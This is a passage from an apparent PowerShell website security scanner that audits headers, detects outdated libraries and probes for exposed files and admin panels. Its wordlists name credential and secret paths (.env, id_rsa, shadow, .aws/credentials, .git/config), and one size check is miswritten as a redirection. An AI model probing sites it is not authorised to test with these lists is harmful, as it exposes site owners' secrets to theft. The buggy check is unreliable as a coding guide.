            'X-Powered-CMS'           = @{ Severity = 'Low'; Desc = 'CMS platform' }
            'X-Generator'             = @{ Severity = 'Low'; Desc = 'Generator software' }
            'X-Drupal-Cache'          = @{ Severity = 'Low'; Desc = 'Drupal CMS' }
            'X-Varnish'               = @{ Severity = 'Low'; Desc = 'Varnish cache' }
            'X-Pingback'              = @{ Severity = 'Low'; Desc = 'WordPress pingback' }
            'X-Backend-Server'        = @{ Severity = 'Medium'; Desc = 'Backend server info' }
            'X-Runtime'               = @{ Severity = 'Low'; Desc = 'Runtime information' }
            'X-Application-Context'   = @{ Severity = 'Medium'; Desc = 'Application context' }
        }
        
        foreach ($header in $techHeaders.Keys) {
            if ($httpResult.Headers[$header]) {
                $headerValue = $httpResult.Headers[$header]
                $headerInfo = $techHeaders[$header]
                
                Write-Warning "$header exposed: $headerValue"
                
                $result.Metrics.StackComponents += @{
                    Name = $headerInfo.Desc
                    VersionGuess = $headerValue
                    Source = "header:$header"
                    Risk = $headerInfo.Severity
                }
                
                Add-Issue -severity $headerInfo.Severity `
                    -title "Technology Stack Disclosure: $header" `
                    -description "$header reveals $($headerInfo.Desc): $headerValue" `
                    -remediation "Remove $header from HTTP responses" `
                    -evidence @{ Header = $header; Value = $headerValue } `
                    -issueType "InfoDisclosure" `
                    -confidence "High"
            }
        }
        
        # ========== TECH INVENTORY FROM HTML ==========
        Write-Info "Phase 3: Technology Inventory from HTML..."
        
        $html = $httpResult.Content
        
        # Meta generator tags
        if ($html -match '<meta\s+name=["' + "'" + ']generator["' + "'" + ']\s+content=["' + "'" + '](.*?)["' + "'" + ']\s*/?>') {
            $generator = $Matches[1]
            Write-Info ("Generator meta tag found: " + $generator)
            
            $result.Metrics.StackComponents += @{
                Name = "Generator"
                VersionGuess = $generator
                Source = "html:meta"
                Risk = "Low"
            }
            
            Add-Issue -severity "Low" `
                -title "Generator Meta Tag Disclosure" `
                -description "HTML contains generator meta tag: $generator" `
                -remediation "Remove generator meta tags from HTML" `
                -issueType "InfoDisclosure" `
                -confidence "High"
        }
        
        # Extract JavaScript libraries
        $jsLibraries = @()
        
        # jQuery detection
        if ($html -match 'jquery[/-](\d+\.\d+\.?\d*)') {
            $version = $Matches[1]
            $jsLibraries += @{ Name = "jQuery"; Version = $version }
            
            # Check for EOL jQuery 1.x
            if ($version -match '^1\.') {
                Write-Warning "End-of-Life jQuery version detected: $version"
                Add-Issue -severity "High" `
                    -title "Outdated jQuery Version (End-of-Life)" `
                    -description "jQuery $version is end-of-life and has known security vulnerabilities" `
                    -remediation "Upgrade to jQuery 3.x or newer" `
                    -evidence @{ Library = "jQuery"; Version = $version } `
                    -issueType "InfoDisclosure" `
                    -confidence "High"
                
                $result.Metrics.StackComponents += @{
                    Name = "jQuery"
                    VersionGuess = $version
                    Source = "html:script"
                    Risk = "High"
                }
            }
        }
        
        # Angular/AngularJS detection
        if ($html -match 'angular(?:js)?[/-](\d+\.\d+\.?\d*)' -or $html -match 'ng-version="(\d+\.\d+\.?\d*)"') {
            $version = $Matches[1]
            $jsLibraries += @{ Name = "Angular"; Version = $version }
            
            # Check for EOL AngularJS 1.x
            if ($version -match '^1\.') {
                Write-Warning ("End-of-Life AngularJS version detected: " + $version)
                Add-Issue -severity "High" `
                    -title "Outdated AngularJS Version (End-of-Life)" `
                    -description "AngularJS $version reached end-of-life and has known vulnerabilities" `
                    -remediation "Migrate to modern Angular (version 2 or higher) or another framework" `
                    -evidence @{ Library = "AngularJS"; Version = $version } `
                    -issueType "InfoDisclosure" `
                    -confidence "High"
                
                $result.Metrics.StackComponents += @{
                    Name = "AngularJS"
                    VersionGuess = $version
                    Source = "html:script"
                    Risk = "High"
                }
            }
        }
        
        # React detection
        if ($html -match 'react[/-](\d+\.\d+\.?\d*)' -or $html -match 'data-reactroot') {
            if ($Matches.Count -gt 0) {
                $version = if ($Matches[1]) { $Matches[1] } else { "Unknown" }
                $jsLibraries += @{ Name = "React"; Version = $version }
                Write-Info "React detected: $version"
            }
        }
        
        # Vue detection
        if ($html -match 'vue[/-](\d+\.\d+\.?\d*)') {
            $version = $Matches[1]
            $jsLibraries += @{ Name = "Vue.js"; Version = $version }
            Write-Info "Vue.js detected: $version"
        }
        
        # WordPress detection
        if ($html -match 'wp-content|wordpress' -or $html -match '/wp-includes/') {
            Write-Info "WordPress detected"
            
            if ($html -match '<meta name="generator" content="WordPress ([0-9\.]+)"') {
                $wpVersion = $Matches[1]
                Write-Warning ("WordPress version exposed: " + $wpVersion)
                
                Add-Issue -severity "Medium" `
                    -title "WordPress Version Disclosure" `
                    -description "WordPress version $wpVersion is exposed in HTML" `
                    -remediation "Remove WordPress version meta tags; keep WordPress updated" `
                    -evidence @{ CMS = "WordPress"; Version = $wpVersion } `
                    -issueType "InfoDisclosure" `
                    -confidence "High"
                
                $result.Metrics.StackComponents += @{
                    Name = "WordPress"
                    VersionGuess = $wpVersion
                    Source = "html:meta"
                    Risk = "Medium"
                }
            }
        }
        
        Write-Success "Application discovery completed"
        $result.Status = "Completed"
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Application discovery failed: $_"
        Write-Log "Test 01 failed: $_" "ERROR"
        $result.Status = "Failed"
        Complete-SecurityTest "Failed"
    }
    
    return $result
}

# ============================================================================
# TEST 2: COMPREHENSIVE SECURITY HEADERS ANALYSIS
# ============================================================================
function Test-SecurityHeaders {
    Start-SecurityTest "Comprehensive Security Headers Analysis" "02"
    
    try {
        # Try to use baseline response first
        $result = $null
        if ($script:baselineResponse.Success -and $script:baselineResponse.Headers) {
            Write-Info "Using cached baseline response for header analysis"
            $result = $script:baselineResponse
        }
        else {
            Write-Info "Baseline not available - fetching headers directly"
            $result = Invoke-SafeWebRequest -uri $site -method "GET"
        }
        
        if (-not $result.Success -or -not $result.Headers) {
            Write-Warning "Could not retrieve headers - attempting HEAD request..."
            $result = Invoke-SafeWebRequest -uri $site -method "HEAD"
            
            if (-not $result.Success -or -not $result.Headers) {
                Write-Danger "Failed to retrieve headers from target (blocked/timeout/WAF)"
                Write-Warning "Cannot confirm header presence - marking as INCONCLUSIVE"
                
                # Mark as INFO "Verification Inconclusive" instead of HIGH "Missing"
                Add-Issue -severity "Info" `
                    -title "Header Verification Inconclusive: Security Headers" `
                    -description "Unable to retrieve response headers from target. Possible causes: rate limiting (429), WAF block (403), network timeout, or server misconfiguration. Cannot confirm presence/absence of security headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options." `
                    -remediation "Manual verification required. Check headers using curl or browser DevTools." `
                    -whyItMatters "Scanner could not establish baseline security posture due to request blocking. This is NOT confirmation that headers are missing - only that verification failed. Target may be protected by WAF or rate limiting." `
                    -suggestedFix "1. Verify headers manually: curl -I https://target.com 2. Check for WAF/CDN (Cloudflare, AWS) that may block automated scanners. 3. If headers truly missing, add HSTS, CSP, X-Frame-Options per OWASP guidelines." `
                    -category "Configuration" `
                    -issueType "VerificationFailed" `
                    -confidence "Low" `
                    -evidence @{
                        RequestedURL = $site
                        Method = "GET/HEAD"
                        Result = "Failed to retrieve response"
                        StatusCode = $result.StatusCode
                    }
                
                Complete-SecurityTest
                return
            }
        }
        
        # If we reach here, we have valid headers - proceed with normal analysis
        
        $securityHeaders = @(
            @{
                Name = "Strict-Transport-Security"
                Description = "Enforces HTTPS connections"
                Severity = "High"
                Recommendation = "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
                Check = {
                    param($value)
                    $issues = @()
                    
                    if ($value -notmatch "max-age=(\d+)") {
                        $issues += "Missing max-age directive"
                    } elseif ($Matches[1] -lt 31536000) {
                        $issues += "max-age too short (< 1 year)"
                    }
                    if ($value -notmatch "includeSubDomains") {
                        $issues += "Missing includeSubDomains"
                    }
                    if ($value -notmatch "preload") {
                        $issues += "Consider adding preload directive"
                    }
                    return $issues
                }
            },
            @{
                Name = "Content-Security-Policy"
                Description = "Prevents XSS and injection attacks"
                Severity = "High"
                Recommendation = "Implement strict CSP with script-src, object-src, base-uri directives"
                Check = {
                    param($value)
                    $issues = @()
                    if ($value -match "unsafe-inline") {
                        $issues += "Contains unsafe-inline (XSS risk)"
                    }
                    if ($value -match "unsafe-eval") {
                        $issues += "Contains unsafe-eval (code injection risk)"
                    }
                    if ($value -match "\*" -and $value -notmatch "img-src \*") {
                        $issues += "Contains wildcard directive (too permissive)"
                    }
                    if ($value -notmatch "default-src") {
                        $issues += "Missing default-src fallback"
                    }
                    return $issues
                }
            },
            @{
                Name = "X-Frame-Options"
                Description = "Prevents clickjacking attacks"
                Severity = "Medium"
                Recommendation = "Set to: DENY or SAMEORIGIN"
                Check = {
                    param($value)
                    $issues = @()
                    if ($value -notmatch "^(DENY|SAMEORIGIN)$") {
                        $issues += "Should be DENY or SAMEORIGIN, found: $value"
                    }
                    return $issues
                }
            },
            @{
                Name = "X-Content-Type-Options"
                Description = "Prevents MIME-sniffing attacks"
                Severity = "Medium"
                Recommendation = "Set to: nosniff"
                Check = {
                    param($value)
                    $issues = @()
                    if ($value -ne "nosniff") {
                        $issues += "Should be 'nosniff', found: $value"
                    }
                    return $issues
                }
            },
            @{
                Name = "X-XSS-Protection"
                Description = "Legacy XSS filter (deprecated)"
                Severity = "Low"
                Recommendation = "Set to: 1; mode=block (or remove if CSP is strong)"
                Check = {
                    param($value)
                    $issues = @()
                    if ($value -eq "0") {
                        $issues += "XSS protection disabled"
                    }
                    return $issues
                }
            },
            @{
                Name = "Referrer-Policy"
                Description = "Controls referrer information"
                Severity = "Low"
                Recommendation = "Use: strict-origin-when-cross-origin or no-referrer"
                Check = { param($value) return @() }
            },
            @{
                Name = "Permissions-Policy"
                Description = "Controls browser features"
                Severity = "Medium"
                Recommendation = "Restrict camera, microphone, geolocation, etc."
                Check = { param($value) return @() }
            },
            @{
                Name = "Cross-Origin-Embedder-Policy"
                Description = "Enables cross-origin isolation"
                Severity = "Low"
                Recommendation = "Set to: require-corp"
                Check = { param($value) return @() }
            },
            @{
                Name = "Cross-Origin-Opener-Policy"
                Description = "Isolates browsing context"
                Severity = "Low"
                Recommendation = "Set to: same-origin"
                Check = { param($value) return @() }
            },
            @{
                Name = "Cross-Origin-Resource-Policy"
                Description = "Protects against cross-origin attacks"
                Severity = "Low"
                Recommendation = "Set to: same-origin or same-site"
                Check = { param($value) return @() }
            }
        )
        
        $headersPresent = 0
        $headersMissing = 0
        
        foreach ($header in $securityHeaders) {
            $headerValue = $result.Headers[$header.Name]
            
            if ($headerValue) {
                $headersPresent++
                Write-Success "$($header.Name) present: $headerValue"
                
                if ($header.Check) {
                    $checkIssues = & $header.Check $headerValue
                    foreach ($issue in $checkIssues) {
                        Write-Warning "$($header.Name): $issue"
                        Add-Issue -severity $header.Severity -title "Weak $($header.Name)" `
                            -description $issue `
                            -remediation $header.Recommendation `
                            -evidence @{ Header = $header.Name; Value = $headerValue; Issue = $issue }
                    }
                }
            } else {
                $headersMissing++
                Write-Danger "$($header.Name) missing"
                
                # Map headers to CWE
                $cweMapping = @{
                    "Strict-Transport-Security" = @{ CWE = "CWE-319"; Category = "Transport" }
                    "Content-Security-Policy" = @{ CWE = "CWE-16"; Category = "Browser Hardening" }
                    "X-Frame-Options" = @{ CWE = "CWE-1021"; Category = "Browser Hardening" }
                    "X-Content-Type-Options" = @{ CWE = "CWE-16"; Category = "Browser Hardening" }
                    "X-XSS-Protection" = @{ CWE = "CWE-79"; Category = "Browser Hardening" }
                    "Referrer-Policy" = @{ CWE = "CWE-200"; Category = "Information Disclosure" }
                    "Permissions-Policy" = @{ CWE = "CWE-16"; Category = "Browser Hardening" }
                    "Cross-Origin-Embedder-Policy" = @{ CWE = "CWE-942"; Category = "Browser Hardening" }
                    "Cross-Origin-Opener-Policy" = @{ CWE = "CWE-942"; Category = "Browser Hardening" }
                    "Cross-Origin-Resource-Policy" = @{ CWE = "CWE-942"; Category = "Browser Hardening" }
                }
                
                $cweId = if ($cweMapping[$header.Name]) { $cweMapping[$header.Name].CWE } else { "" }
                $category = if ($cweMapping[$header.Name]) { $cweMapping[$header.Name].Category } else { "Configuration" }
                
                Add-Issue -severity $header.Severity `
                    -title "Missing Security Header: $($header.Name)" `
                    -description "$($header.Description). This header is not present." `
                    -remediation $header.Recommendation `
                    -cweId $cweId `
                    -category $category `
                    -confidence "High"
            }
        }
        
        $score = [math]::Round(($headersPresent / $securityHeaders.Count) * 100)
        $headersSummary = "$headersPresent of $($securityHeaders.Count) present"
        Write-Info ("Security Headers Score: " + $score + "% (" + $headersSummary + ")")
        
        if ($score -lt 50) {
            Write-Danger "Poor security headers implementation"
        } elseif ($score -lt 80) {
            Write-Warning "Moderate security headers implementation"
        } else {
            Write-Success "Good security headers implementation"
        }
        
        # ========================================================================
        # CHECK FOR DANGEROUS DEBUG/DIAGNOSTIC HEADERS
        # ========================================================================
        Write-Info "Checking for internal diagnostic headers..."
        
        $diagnosticHeaders = @(
            "X-Debug-Token",
            "X-Debug-Token-Link",
            "X-Request-Id",
            "X-Env",
            "X-Stage",
            "X-Environment",
            "X-Application-Context",
            "Server-Timing",
            "X-Runtime",
            "X-Powered-By",
            "X-AspNet-Version",
            "X-AspNetMvc-Version"
        )
        
        $foundDiagnosticHeaders = @()
        
        foreach ($diagHeader in $diagnosticHeaders) {
            if ($result.Headers.ContainsKey($diagHeader)) {
                $headerValue = $result.Headers[$diagHeader]
                Write-Warning "Internal diagnostic header exposed: $diagHeader = $headerValue"
                $foundDiagnosticHeaders += "$diagHeader"
                
                $severity = "Medium"
                if ($diagHeader -match "Debug|Environment|Stage") {
                    $severity = "Medium"
                } elseif ($diagHeader -match "Powered-By|AspNet") {
                    $severity = "Low"
                }
                
                Add-Issue -severity $severity `
                    -title "Internal Diagnostic Header Exposed" `
                    -description "Production environment is exposing internal diagnostic header: $diagHeader with value: $headerValue" `
                    -remediation "Disable debug headers in production. Remove or filter these headers in web server config." `
                    -whyItMatters "Diagnostic headers leak framework versions, internal service names, request IDs, and environment details. Attackers use this information to identify vulnerable versions and map your infrastructure." `
                    -suggestedFix "Nginx: add 'more_clear_headers' for these headers. Apache: use 'Header unset'. Application: disable debug mode and remove debug middleware in production." `
                    -issueType "InfoDisclosure" `
                    -confidence "High" `
                    -evidence @{ Header = $diagHeader; Value = $headerValue }
            }
        }
        
        if ($foundDiagnosticHeaders.Count -gt 0) {
            Write-Warning "Found $($foundDiagnosticHeaders.Count) diagnostic header(s): $($foundDiagnosticHeaders -join ', ')"
        } else {
            Write-Success "No internal diagnostic headers detected"
        }
        
        Complete-SecurityTest
    }
    catch {
        Write-Danger "Security headers test failed: $_"
        Complete-SecurityTest "Failed"
    }
}

# ============================================================================
# TEST 3: ENHANCED SENSITIVE FILES & BACKUP DISCOVERY
# ============================================================================
function Test-SensitiveFiles {
    Start-SecurityTest "Enhanced Sensitive Files & Backup Discovery" "03"
    
    $fileCategories = @{
        "Environment Files" = @(
            ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
            ".env.backup", ".env.old", ".env.bak", ".env.save", ".env.swp",
            ".env.example", ".env.sample", ".env.dist", ".env.template"
        )
        "Version Control" = @(
            ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
            ".gitignore", ".gitattributes", ".git/", ".svn/entries", ".svn/", ".hg/", ".bzr/"
        )
        "Configuration Files" = @(
            "config.php", "config.py", "config.json", "config.yml", "config.yaml",
            "configuration.php", "settings.py", "settings.php", "settings.json",
            "app.config", "web.config", "Web.config",
            "database.yml", "database.php", "db.php", "db.json",
            "connection.php", "connect.php"
        )
        "Database Files" = @(
            "backup.sql", "dump.sql", "database.sql", "db.sql", "data.sql",
            "mysql.sql", "postgres.sql", "mongo.sql",
            "database.db", "db.sqlite", "db.sqlite3", "data.sqlite",
            "database.mdb", "database.accdb"
        )
        "Backup Archives" = @(
            "backup.zip", "backup.tar.gz", "backup.tar", "backup.rar",
            "site.zip", "www.zip", "web.zip", "public.zip",
            "backup.7z", "backup.bak", "backup.old",
            "backup/", "backups/", "old/", "archive/"
        )
        "Credentials" = @(
            "passwords.txt", "password.txt", "creds.txt", "credentials.txt",
            ".htpasswd", "passwd", "shadow",
            "id_rsa", "id_dsa", ".ssh/", "privatekey.pem",
            "key.pem", "certificate.pem"
        )
        "Server Config" = @(
            ".htaccess", "httpd.conf", "apache.conf", "nginx.conf",
            "php.ini", ".user.ini"
        )
        "Package Managers" = @(
            "composer.json", "composer.lock", "composer.phar",
            "package.json", "package-lock.json", "yarn.lock",
            "requirements.txt", "Pipfile", "Pipfile.lock",
            "Gemfile", "Gemfile.lock", "pom.xml", "build.gradle"
        )
        "Docker & Cloud" = @(
            "docker-compose.yml", "docker-compose.yaml", "Dockerfile",
            ".dockerignore", "Vagrantfile",
            ".aws/credentials", ".azure/", "firebase.json", ".firebaserc",
            "gcloud.json", ".gcloud/"
        )
        "IDE & Development" = @(
            ".idea/", ".vscode/", ".vscode/settings.json",
            "nbproject/", ".project", ".classpath",
            ".sublime-project", ".sublime-workspace"
        )
        "Log Files" = @(
            "error.log", "error_log", "errors.log",
            "access.log", "access_log",
            "debug.log", "app.log", "application.log",
            "logs/", "log/", "laravel.log"
        )
        "Documentation" = @(
            "README.md", "CHANGELOG.md", "TODO.md", "NOTES.txt",
            "docs/", "documentation/", "api-docs/"
        )
        "Test & Debug" = @(
            "phpinfo.php", "info.php", "test.php", "debug.php",
            "test.html", "test.txt", "temp.txt", "tmp.txt",
            "test/", "tests/", "testing/"
        )
        "Admin Tools" = @(
            "admin.php", "adminer.php", "pma/", "phpmyadmin/",
            "phpmyadmin/index.php", "phpMyAdmin/", "mysql/",
            "mysqladmin/", "sql.php"
        )
    }
    
    $allFiles = @()
    foreach ($category in $fileCategories.Keys) {
        foreach ($file in $fileCategories[$category]) {
            $allFiles += @{ Path = $file; Category = $category }
        }
    }
    
    $totalFiles     = $allFiles.Count
    $checkedFiles   = 0
    $exposedFiles   = @()
    $forbiddenFiles = @()
    
    Write-Info "Scanning $totalFiles sensitive paths..."
    
    foreach ($fileInfo in $allFiles) {
        $file     = $fileInfo.Path
        $category = $fileInfo.Category
        $checkedFiles++
        
        if ($checkedFiles % 20 -eq 0) {
            $percent = [math]::Round(($checkedFiles / $totalFiles) * 100)
            Write-Progress-Custom "Scanning sensitive files" "$checkedFiles / $totalFiles checked" $percent
        }
        
        $testUrl = $site + "/" + $file
        $result = Invoke-SafeWebRequest -uri $testUrl -method "GET" -timeoutSec 3
        
        if ($result.Success -and $result.StatusCode -eq 200) {
            $contentLength = $result.Content.Length
            
            # Check for custom 404 pretending to be 200
            if ($result.Content -match "404|not found|page not found" -and $contentLength -lt 2000) {
                Write-Debug "$file -> Custom 404 page (ignored)"
                continue
            }
            
            Write-Danger "EXPOSED: /$file [$category] (200 OK, $contentLength bytes)"
            
            $exposedFiles += $fileInfo
            
            $severity = "Critical"
            if ($category -in @("Documentation", "Package Managers")) {
                $severity = "Medium"
            } elseif ($category -in @("IDE & Development")) {
                $severity = "Low"
            }
            
            Add-Issue -severity $severity -title "Sensitive File Exposed: $file" `
                -description "[$category] File publicly accessible ($contentLength bytes)" `
                -url $testUrl `
                -remediation "Remove or restrict access to this file" `
                -evidence @{ Category = $category; Size = $contentLength; Path = $file }
                
        } elseif ($result.StatusCode -eq 403) {
            $forbiddenFiles += $file
            Write-Debug "$file -> 403 Forbidden (good)"
        }
        
        if (-not $quick) {
            Start-Sleep -Milliseconds 50
        }
    }
    
    Write-Progress-Custom "Scanning sensitive files" "Complete" 100
    
    Write-Host ""
    Write-Info "Scan complete: $checkedFiles files checked"
    Write-Info "Exposed files: $($exposedFiles.Count)"
    Write-Info "Forbidden (403): $($forbiddenFiles.Count)"
    
    if ($exposedFiles.Count -gt 0) {
        Write-Danger "CRITICAL: $($exposedFiles.Count) sensitive file(s) publicly accessible!"
        Write-Host ""
        Write-Host "Exposed files by category:" -ForegroundColor Red
        $exposedFiles | Group-Object Category | ForEach-Object {
            Write-Host "  - $($_.Name): $($_.Count) file(s)" -ForegroundColor Yellow
        }
    } else {
        Write-Success "No sensitive files publicly accessible"
    }
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 4: ADMIN PANEL & AUTHENTICATION DISCOVERY
# (FIXED: robust handling of byte[] Content + content-type guard)
# ============================================================================
function Test-AdminPanelDiscovery {
    Start-SecurityTest "Admin Panel & Authentication Discovery" "04"
    
    $adminPaths = @(
        # Generic admin paths
        "/admin", "/admin/", "/admin/dashboard", "/admin/login", "/admin/index",
        "/administrator", "/administrator/", "/admincp", "/admin_panel", "/admin-panel",
        "/control-panel", "/controlpanel", "/cpanel", "/webadmin", "/sysadmin",
        "/management", "/manager", "/backend", "/back-end", "/dashboard", "/panel",
        
        # CMS specific
        "/wp-admin", "/wp-admin/", "/wp-login.php", "/wordpress/wp-admin",
        "/joomla/administrator", "/drupal/admin", "/umbraco", "/admin/cms",
        "/ghost/admin", "/concrete5/dashboard",
        
        # Database admin
        "/phpmyadmin", "/phpmyadmin/", "/phpMyAdmin", "/pma", "/dbadmin",
        "/adminer", "/adminer.php", "/mysql", "/mysqladmin", "/db",
        
        # API endpoints
        "/api/admin", "/api/v1/admin", "/api/users", "/api/config",
        "/graphql", "/api/graphql",
        
        # Server status
        "/server-status", "/server-info", "/status", "/health",
        
        # Framework specific
        "/rails/admin", "/django-admin", "/admin.php", "/admin.html",
        "/laravel/admin", "/symfony/admin"
    )
    
    $accessiblePanels = @()
    $protectedPanels  = @()
    
    Write-Info "Testing $($adminPaths.Count) admin paths..."
    
    $checked = 0
    foreach ($path in $adminPaths) {
        $checked++
        if ($checked % 10 -eq 0) {
            Write-Progress-Custom "Admin panel discovery" "$checked / $($adminPaths.Count)" `
                ([math]::Round(($checked / $adminPaths.Count) * 100))
        }
        
        $result = Invoke-SafeWebRequest -uri ($site + $path) -method "GET" -timeoutSec 3
        
        if ($result.Success -and $result.StatusCode -eq 200) {
            # --- FIX START: normalize content safely and guard by content-type ---
            $contentType   = $result.Headers['Content-Type']
            $rawContent    = $result.Content
            $looksTextual  = $true

            if ($contentType) {
                if ($contentType -notmatch 'text|json|xml|html|javascript|css') {
                    $looksTextual = $false
                }
            }

            # If we got non-text content and can't decode, skip admin heuristics
            $content = ""
            if ($rawContent -is [byte[]]) {
                try {
                    $content = [System.Text.Encoding]::UTF8.GetString($rawContent)
                } catch {
                    $content = ""
                }
            } else {
                $content = [string]$rawContent
            }

            if (-not $looksTextual -and [string]::IsNullOrEmpty($content)) {
                Write-Debug "$path -> 200 but non-text content ($contentType), skipping admin checks"
                if (-not $quick) { Start-Sleep -Milliseconds 50 }
                continue
            }

            $lowerContent = $content.ToLower()
            # --- FIX END ---

            $indicators = @(
                "login", "password", "username", "admin", "dashboard",
                "sign in", "sign-in", "signin", "log in", "authentication"
            )
            
            $isAdminPage = $false
            foreach ($indicator in $indicators) {
                if ($lowerContent -match [regex]::Escape($indicator)) {
                    $isAdminPage = $true
                    break
                }
            }
            
            if ($isAdminPage) {
                Write-Warning "Admin interface accessible at: $path"
                $accessiblePanels += $path
                
                Add-Issue -severity "Medium" -title "Admin Panel Accessible" `
                    -description "Administrative interface found at: $path" `
                    -url ($site + $path) `
                    -remediation "Restrict access via IP whitelist, VPN, or strong authentication"
            } else {
                Write-Debug "$path returned 200 but doesn't appear to be admin page"
            }
            
        } elseif ($result.StatusCode -eq 401) {
            Write-Success "$path -> 401 (authentication required)"
            $protectedPanels += $path
        } elseif ($result.StatusCode -eq 403) {
            Write-Success "$path -> 403 (forbidden)"
            $protectedPanels += $path
        }
        
        if (-not $quick) {
            Start-Sleep -Milliseconds 50
        }
    }
    
    Write-Host ""
    Write-Info "Admin discovery complete"
    Write-Info "Accessible panels: $($accessiblePanels.Count)"
    Write-Info "Protected panels: $($protectedPanels.Count)"
    
    Complete-SecurityTest
}

# ============================================================================
# TEST 4B: ENHANCED CONTENT DISCOVERY / SMART DIRECTORY BRUTE-FORCE
# ============================================================================
function Test-EnhancedContentDiscovery {
    Start-SecurityTest "Enhanced Content Discovery" "04B"
    
    Write-Info "Smart directory and backup discovery..."
    
    $discoveryWordlist = @(
        "admin", "dev", "backup", "staging", "test", "old", "private", "internal",
        "dashboard", "debug", "report", "archive", "temp", "tmp", "cache", "logs",
        "data", "files", "upload", "uploads", "media", "assets", "static", "public",
        "api", "v1", "v2", "beta", "alpha", "demo", "preview", "sandbox",
        "config", "conf", "cfg", "settings", "env", "db", "database",
        "bak", "backup_2024", "backup_2023", "old-site", "oldsite", "legacy",
        "build", "dist", "release", "deploy", "deployment", "prod", "production",
        "stage", "stg", "dev", "development", "qa", "testing"
    )
    
    $fileExtensions = @("", ".zip", ".tar.gz", ".tar", ".bak", ".sql", ".txt", ".log")
    
    $criticalFinds = @()
    $highFinds = @()
    $mediumFinds = @()
    $checked = 0
    $total = $discoveryWordlist.Count * $fileExtensions.Count
    
    Write-Info "Testing $total potential discovery paths..."
    
    foreach ($word in $discoveryWordlist) {
        foreach ($ext in $fileExtensions) {
            $checked++
            
            if ($checked % 25 -eq 0) {
                Write-Progress -Activity "Content Discovery" -Status "$checked of $total paths" -PercentComplete (($checked / $total) * 100)
            }
            
            # Build path
            if ($ext -eq "") {
                $testPath = "/$word/"
            } else {
                $testPath = "/$word$ext"
            }
            
            $fullUrl = $site + $testPath
            $result = Invoke-SafeWebRequest -uri $fullUrl -method "GET" -timeoutSec 3
            
            if ($result.StatusCode -eq 200) {
                $contentType = ""
                if ($result.Headers -and $result.Headers.ContainsKey('Content-Type')) {
                    $contentType = $result.Headers['Content-Type']
                }
                
                $contentLength = 0
                if ($result.Content) {
                    $contentLength = $result.Content.Length
                }
                
                # CRITICAL: Leaked backups / archives
                if ($contentType -match 'zip|tar|gzip|x-compressed|application/x-tar|application/x-gzip') {
                    Write-Danger "CRITICAL: Downloadable backup/archive found - $testPath ($contentType, $contentLength bytes)"
                    $criticalFinds += $testPath
                    
                    Add-Issue -severity "Critical" `
                        -title "Leaked Backup Archive" `
                        -description "Downloadable backup/archive accessible at $testPath. Content-Type: $contentType, Size: $contentLength bytes. This likely contains source code, configuration files, or database dumps." `
                        -url $fullUrl `
                        -remediation "Immediately remove or restrict access to backup files. Never store backups in public web directories." `
                        -whyItMatters "Backup archives expose complete source code, credentials, database dumps, and infrastructure details. Attackers download these files to find vulnerabilities, extract secrets, or clone your entire application." `
                        -suggestedFix "Move backups to non-web-accessible storage (S3 with auth, secure FTP, off-server). If needed publicly, use signed URLs with expiration. Add .htaccess deny rules for backup extensions." `
                        -issueType "SensitiveDataExposure" `
                        -confidence "High"
                }
                # HIGH: Debug/development interfaces
                elseif ($contentLength > 100) {
                    $content = $result.Content.ToLower()
                    
                    # Check for framework debug pages
                    if ($content -match 'debug|debugger|stack trace|exception|laravel|django debug|rails console|flask debugger|phpinfo|xdebug') {
                        Write-Danger "HIGH: Debug interface exposed - $testPath"
                        $highFinds += $testPath
                        
                        Add-Issue -severity "High" `
                            -title "Debug Interface Exposed" `
                            -description "Debug/development interface found at $testPath. Page contains debug keywords suggesting framework error pages or development tools." `
                            -url $fullUrl `
                            -remediation "Disable debug mode in production. Set DEBUG=False (Django), APP_DEBUG=false (Laravel), or equivalent." `
                            -whyItMatters "Debug interfaces reveal stack traces, source code paths, environment variables, database queries, and internal application structure. Attackers use this info to craft targeted exploits." `
                            -suggestedFix "Set environment to production mode. Remove debug packages from production builds. Configure error handlers to log server-side only, show generic errors to users." `
                            -issueType "SecurityMisconfiguration" `
                            -confidence "High"
                    }
                    # Check for directory listings
                    elseif ($content -match 'index of|directory listing|parent directory|\[dir\]|\[  \]') {
                        Write-Warning "Directory listing enabled - $testPath"
                        $mediumFinds += $testPath
                        
                        Add-Issue -severity "Medium" `
                            -title "Directory Listing Enabled" `
                            -description "Directory browsing is enabled at $testPath, allowing enumeration of files and subdirectories." `
                            -url $fullUrl `
                            -remediation "Disable directory browsing: Options -Indexes (Apache) or autoindex off (Nginx)" `
                            -whyItMatters "Directory listings help attackers discover hidden files, backup files, and application structure. They can find config files, old scripts, or sensitive documents not linked from main site." `
                            -suggestedFix "Apache: Add 'Options -Indexes' to .htaccess or httpd.conf. Nginx: ensure 'autoindex off;' in location blocks. IIS: disable directory browsing in IIS Manager." `
                            -issueType "SecurityMisconfiguration" `
                            -confidence "High"
                    }
                }
            }
            elseif ($result.StatusCode -eq 403) {
                # Interesting: endpoint exists but forbidden
                if ($word -in @("admin", "backup", "private", "internal", "config", "db", "database")) {
                    Write-Warning "Sensitive endpoint exists but forbidden (403): $testPath"
                    $mediumFinds += $testPath
                    
                    Add-Issue -severity "Medium" `
                        -title "Sensitive Endpoint Discoverable (403)" `
                        -description "Sensitive path $testPath exists (returns 403). While access is denied, the endpoint's existence is discoverable, revealing application structure." `
                        -url $fullUrl `
                        -remediation "Return 404 for sensitive endpoints to prevent information disclosure. Or move behind firewall/VPN." `
                        -whyItMatters "403 responses confirm the endpoint exists. Attackers know you have /admin or /backup directories and can focus reconnaissance there. 404 provides no confirmation." `
                        -suggestedFix "Configure web server to return 404 instead of 403 for sensitive paths. Better yet, firewall these paths so they never reach the web server." `
                        -issueType "InfoDisclosure" `
                        -confidence "Medium"
                }
            }
            
            if (-not $quick) {
                Start-Sleep -Milliseconds 30
            }
        }
    }
    
    Write-Progress -Activity "Content Discovery" -Completed
    
    # Summary
    Write-Host ""
    if ($criticalFinds.Count -gt 0) {
        Write-Danger "CONTENT DISCOVERY SUMMARY:"
        Write-Danger "  CRITICAL: $($criticalFinds.Count) backup/archive file(s) exposed"
        Write-Host "  Leaked: $($criticalFinds -join ', ')" -ForegroundColor Red
    }
    if ($highFinds.Count -gt 0) {
        Write-Warning "  HIGH: $($highFinds.Count) debug interface(s) or sensitive content"
